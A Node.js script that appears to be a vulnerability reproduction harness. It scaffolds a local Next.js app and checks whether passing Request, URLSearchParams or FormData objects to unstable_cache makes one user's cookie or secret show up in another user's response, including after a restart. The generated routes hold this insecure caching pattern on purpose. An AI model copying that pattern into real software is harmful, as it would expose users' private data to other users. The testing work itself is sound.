import childProcess from 'node:child_process'
import fs from 'node:fs/promises'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import process from 'node:process'
import { fileURLToPath } from 'node:url'

const root = path.dirname(fileURLToPath(import.meta.url))

function parseArgs(argv) {
  const args = {
    workDir: path.join(root, 'run', 'stock-nextjs-unstable-cache'),
    port: 3560,
    nextVersion: '16.3.0-canary.70',
    keepServer: false,
  }
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i]
    if (arg === '--work-dir') {
      args.workDir = path.resolve(argv[++i])
    } else if (arg === '--port') {
      args.port = Number(argv[++i])
    } else if (arg === '--next-version') {
      args.nextVersion = argv[++i]
    } else if (arg === '--keep-server') {
      args.keepServer = true
    } else {
      throw new Error(`unknown argument: ${arg}`)
    }
  }
  return args
}

async function writeFile(name, data) {
  await fs.mkdir(path.dirname(name), { recursive: true })
  await fs.writeFile(name, data)
}

function run(cmd, args, cwd) {
  const npmCli = path.join(path.dirname(process.execPath), 'node_modules', 'npm', 'bin', 'npm-cli.js')
  const command = process.platform === 'win32' && cmd === 'npm' ? process.execPath : cmd
  const finalArgs = process.platform === 'win32' && cmd === 'npm' ? [npmCli, ...args] : args
  const result = childProcess.spawnSync(command, finalArgs, {
    cwd,
    encoding: 'utf8',
  })
  return result
}

function spawnNext(appDir, port) {
  return childProcess.spawn(
    process.execPath,
    ['node_modules/next/dist/bin/next', 'start', '-H', '127.0.0.1', '-p', String(port)],
    {
      cwd: appDir,
      stdio: ['ignore', 'pipe', 'pipe'],
      windowsHide: true,
    }
  )
}

async function waitForPort(port, proc) {
  const start = Date.now()
  let output = ''
  proc.stdout.on('data', (chunk) => {
    output += chunk.toString()
  })
  proc.stderr.on('data', (chunk) => {
    output += chunk.toString()
  })
  while (Date.now() - start < 30000) {
    if (proc.exitCode !== null) {
      throw new Error(`next exited early with ${proc.exitCode}\n${output}`)
    }
    try {
      await new Promise((resolve, reject) => {
        const socket = net.connect(port, '127.0.0.1')
        socket.once('connect', () => {
          socket.end()
          resolve()
        })
        socket.once('error', reject)
      })
      return output
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 250))
    }
  }
  throw new Error(`timed out waiting for next\n${output}`)
}

async function stop(proc) {
  if (proc && proc.exitCode === null) {
    proc.kill('SIGTERM')
    await new Promise((resolve) => {
      const timer = setTimeout(resolve, 5000)
      proc.once('exit', () => {
        clearTimeout(timer)
        resolve()
      })
    })
  }
}

async function get(origin, pathname, cookie) {
  const res = await fetch(`${origin}${pathname}`, {
    headers: cookie ? { cookie } : {},
    redirect: 'manual',
  })
  return {
    status: res.status,
    body: (await res.text()).trim(),
  }
}

async function post(origin, pathname, fields) {
  const res = await fetch(`${origin}${pathname}`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(fields),
    redirect: 'manual',
  })
  return {
    status: res.status,
    body: (await res.text()).trim(),
  }
}

function includesAll(text, needles) {
  return needles.every((needle) => text.includes(needle))
}

async function createApp(appDir, nextVersion) {
  await fs.rm(appDir, { recursive: true, force: true })
  await fs.mkdir(appDir, { recursive: true })
  await writeFile(path.join(appDir, 'package.json'), `${JSON.stringify({
    private: true,
    scripts: {
      build: 'next build',
      start: 'next start -H 127.0.0.1',
    },
    dependencies: {
      next: nextVersion,
      react: '19.2.3',
      'react-dom': '19.2.3',
    },
  }, null, 2)}\n`)
  await writeFile(path.join(appDir, 'next.config.js'), 'module.exports = {}\n')
  await writeFile(path.join(appDir, 'app', 'layout.jsx'), `export default function RootLayout({ children }) {
  return (
    <html>
      <body>{children}</body>
    </html>
  )
}
`)
  await writeFile(path.join(appDir, 'app', 'page.jsx'), `export default function Page() {
  return <main>ready</main>
}
`)
  await writeFile(path.join(appDir, 'app', 'api', 'request', 'route.js'), `import { unstable_cache } from 'next/cache'

export const dynamic = 'force-dynamic'

function cachedRequestFor(group) {
  return unstable_cache(
    async (request) => {
      return \`REQ_COOKIE=\${request.headers.get('cookie') ?? 'missing'};REQ_URL=\${request.url};JSON=\${JSON.stringify(request)};TS=\${Date.now()}\`
    },
    ['request-object', group],
    { revalidate: 3600 }
  )
}

function cachedRequestValueFor(group) {
  return unstable_cache(
    async (cookieHeader) => {
      return \`REQ_VALUE_COOKIE=\${cookieHeader ?? 'missing'};TS=\${Date.now()}\`
    },
    ['request-value', group],
    { revalidate: 3600 }
  )
}

export async function GET(request) {
  const url = new URL(request.url)
  const group = url.searchParams.get('group') || 'default'
  const mode = url.searchParams.get('mode') || 'object'
  const result = mode === 'value'
    ? await cachedRequestValueFor(group)(request.headers.get('cookie'))
    : await cachedRequestFor(group)(request)
  return new Response(result, { headers: { 'content-type': 'text/plain' } })
}
`)
  await writeFile(path.join(appDir, 'app', 'api', 'urlsearch', 'route.js'), `import { unstable_cache } from 'next/cache'

export const dynamic = 'force-dynamic'

function cachedUrlSearchFor(group) {
  return unstable_cache(
    async (searchParams) => {
      return \`URL_SECRET=\${searchParams.get('secret') ?? 'missing'};JSON=\${JSON.stringify(searchParams)};TS=\${Date.now()}\`
    },
    ['urlsearch-object', group],
    { revalidate: 3600 }
  )
}

function cachedUrlSearchValueFor(group) {
  return unstable_cache(
    async (secret) => {
      return \`URL_VALUE_SECRET=\${secret ?? 'missing'};TS=\${Date.now()}\`
    },
    ['urlsearch-value', group],
    { revalidate: 3600 }
  )
}

export async function GET(request) {
  const searchParams = new URL(request.url).searchParams
  const group = searchParams.get('group') || 'default'
  const mode = searchParams.get('mode') || 'object'
  const result = mode === 'value'
    ? await cachedUrlSearchValueFor(group)(searchParams.get('secret'))
    : await cachedUrlSearchFor(group)(searchParams)
  return new Response(result, { headers: { 'content-type': 'text/plain' } })
}
`)
  await writeFile(path.join(appDir, 'app', 'api', 'form', 'route.js'), `import { unstable_cache } from 'next/cache'

export const dynamic = 'force-dynamic'

function cachedFormFor(group) {
  return unstable_cache(
    async (formData) => {
      return \`FORM_SECRET=\${formData.get('secret') ?? 'missing'};JSON=\${JSON.stringify(formData)};TS=\${Date.now()}\`
    },
    ['form-object', group],
    { revalidate: 3600 }
  )
}

function cachedFormValueFor(group) {
  return unstable_cache(
    async (secret) => {
      return \`FORM_VALUE_SECRET=\${secret ?? 'missing'};TS=\${Date.now()}\`
    },
    ['form-value', group],
    { revalidate: 3600 }
  )
}

export async function POST(request) {
  const formData = await request.formData()
  const group = formData.get('group') || 'default'
  const mode = formData.get('mode') || 'object'
  const result = mode === 'value'
    ? await cachedFormValueFor(group)(formData.get('secret'))
    : await cachedFormFor(group)(formData)
  return new Response(result, { headers: { 'content-type': 'text/plain' } })
}
`)
}

async function main() {
  const args = parseArgs(process.argv.slice(2))
  const appDir = path.join(args.workDir, 'app')
  const logsDir = path.join(args.workDir, 'logs')
  const origin = `http://127.0.0.1:${args.port}`
  await fs.rm(args.workDir, { recursive: true, force: true })
  await fs.mkdir(logsDir, { recursive: true })
  await createApp(appDir, args.nextVersion)

  const install = run('npm', ['install', '--no-audit', '--no-fund'], appDir)
  await writeFile(path.join(logsDir, 'npm-install.stdout.log'), install.stdout ?? '')
  await writeFile(path.join(logsDir, 'npm-install.stderr.log'), install.stderr ?? String(install.error ?? ''))
  if (install.status !== 0) {
    throw new Error('npm install failed')
  }

  const build = run('npm', ['run', 'build'], appDir)
  await writeFile(path.join(logsDir, 'next-build.stdout.log'), build.stdout ?? '')
  await writeFile(path.join(logsDir, 'next-build.stderr.log'), build.stderr ?? String(build.error ?? ''))
  if (build.status !== 0) {
    throw new Error('next build failed')
  }

  let server
  const evidence = {
    nextVersion: args.nextVersion,
    platform: `${os.platform()} ${os.arch()}`,
    node: process.version,
    results: {},
    restart: {},
  }

  try {
    server = spawnNext(appDir, args.port)
    evidence.startup = await waitForPort(args.port, server)

    evidence.results.requestObjectAliceBob = [
      await get(origin, '/api/request?group=request-a&case=alice', 'victim=alice'),
      await get(origin, '/api/request?group=request-a&case=bob', 'victim=bob'),
    ]
    evidence.results.requestObjectBobAlice = [
      await get(origin, '/api/request?group=request-b&case=bob', 'victim=bob'),
      await get(origin, '/api/request?group=request-b&case=alice', 'victim=alice'),
    ]
    evidence.results.requestValueControl = [
      await get(origin, '/api/request?mode=value&group=request-value', 'victim=alice'),
      await get(origin, '/api/request?mode=value&group=request-value', 'victim=bob'),
    ]
    evidence.results.urlSearchAliceBob = [
      await get(origin, '/api/urlsearch?group=url-a&secret=alice'),
      await get(origin, '/api/urlsearch?group=url-a&secret=bob'),
    ]
    evidence.results.urlSearchBobAlice = [
      await get(origin, '/api/urlsearch?group=url-b&secret=bob'),
      await get(origin, '/api/urlsearch?group=url-b&secret=alice'),
    ]
    evidence.results.urlSearchValueControl = [
      await get(origin, '/api/urlsearch?mode=value&group=url-value&secret=alice'),
      await get(origin, '/api/urlsearch?mode=value&group=url-value&secret=bob'),
    ]
    evidence.results.formDataAliceBob = [
      await post(origin, '/api/form', { group: 'form-a', secret: 'alice' }),
      await post(origin, '/api/form', { group: 'form-a', secret: 'bob' }),
    ]
    evidence.results.formDataBobAlice = [
      await post(origin, '/api/form', { group: 'form-b', secret: 'bob' }),
      await post(origin, '/api/form', { group: 'form-b', secret: 'alice' }),
    ]
    evidence.results.formDataValueControl = [
      await post(origin, '/api/form', { mode: 'value', group: 'form-value', secret: 'alice' }),
      await post(origin, '/api/form', { mode: 'value', group: 'form-value', secret: 'bob' }),
    ]

    await stop(server)
    server = undefined

    server = spawnNext(appDir, args.port)
    evidence.restartStartup = await waitForPort(args.port, server)
    evidence.restart.requestObject = await get(origin, '/api/request?group=request-a&case=charlie', 'victim=charlie')
    evidence.restart.urlSearch = await get(origin, '/api/urlsearch?group=url-a&secret=charlie')
    evidence.restart.formData = await post(origin, '/api/form', { group: 'form-a', secret: 'charlie' })
  } finally {
    if (!args.keepServer) {
      await stop(server)
    }
  }

  const checks = {
    requestObjectAliceBob: includesAll(evidence.results.requestObjectAliceBob[1].body, ['REQ_COOKIE=victim=alice', 'JSON={}']),
    requestObjectBobAlice: includesAll(evidence.results.requestObjectBobAlice[1].body, ['REQ_COOKIE=victim=bob', 'JSON={}']),
    requestValueControl: evidence.results.requestValueControl[0].body.includes('victim=alice') && evidence.results.requestValueControl[1].body.includes('victim=bob'),
    urlSearchAliceBob: includesAll(evidence.results.urlSearchAliceBob[1].body, ['URL_SECRET=alice', 'JSON={}']),
    urlSearchBobAlice: includesAll(evidence.results.urlSearchBobAlice[1].body, ['URL_SECRET=bob', 'JSON={}']),
    urlSearchValueControl: evidence.results.urlSearchValueControl[0].body.includes('URL_VALUE_SECRET=alice') && evidence.results.urlSearchValueControl[1].body.includes('URL_VALUE_SECRET=bob'),
    formDataAliceBob: includesAll(evidence.results.formDataAliceBob[1].body, ['FORM_SECRET=alice', 'JSON={}']),
    formDataBobAlice: includesAll(evidence.results.formDataBobAlice[1].body, ['FORM_SECRET=bob', 'JSON={}']),
    formDataValueControl: evidence.results.formDataValueControl[0].body.includes('FORM_VALUE_SECRET=alice') && evidence.results.formDataValueControl[1].body.includes('FORM_VALUE_SECRET=bob'),
    restartRequestObject: evidence.restart.requestObject.body.includes('REQ_COOKIE=victim=alice'),
    restartUrlSearch: evidence.restart.urlSearch.body.includes('URL_SECRET=alice'),
    restartFormData: evidence.restart.formData.body.includes('FORM_SECRET=alice'),
  }
  evidence.checks = checks
  const confirmed = Object.values(checks).every(Boolean)
  evidence.confirmed = confirmed
  await writeFile(path.join(logsDir, 'evidence.json'), `${JSON.stringify(evidence, null, 2)}\n`)

  const markerFile = path.join(args.workDir, 'VULNERABILITY_CONFIRMED.marker')
  if (confirmed) {
    await writeFile(markerFile, [
      'confirmed=true',
      `next_version=${args.nextVersion}`,
      'request_object_second_seen=alice',
      'urlsearch_second_seen=alice',
      'formdata_second_seen=alice',
      'restart_request_object_seen=alice',
      'restart_urlsearch_seen=alice',
      'restart_formdata_seen=alice',
      '',
    ].join('\n'))
  }

  console.log(`next_version=${args.nextVersion}`)
  console.log(`build_exit=${build.status}`)
  for (const [name, value] of Object.entries(checks)) {
    console.log(`${name}=${value}`)
  }
  console.log(`confirmed=${confirmed}`)
  console.log(`marker_file=${confirmed ? markerFile : ''}`)
  console.log(`evidence_json=${path.join(logsDir, 'evidence.json')}`)
  console.log(`work_dir=${args.workDir}`)
  if (!confirmed) {
    process.exitCode = 1
  }
}

main().catch((error) => {
  console.error(error.stack || String(error))
  process.exitCode = 1
})
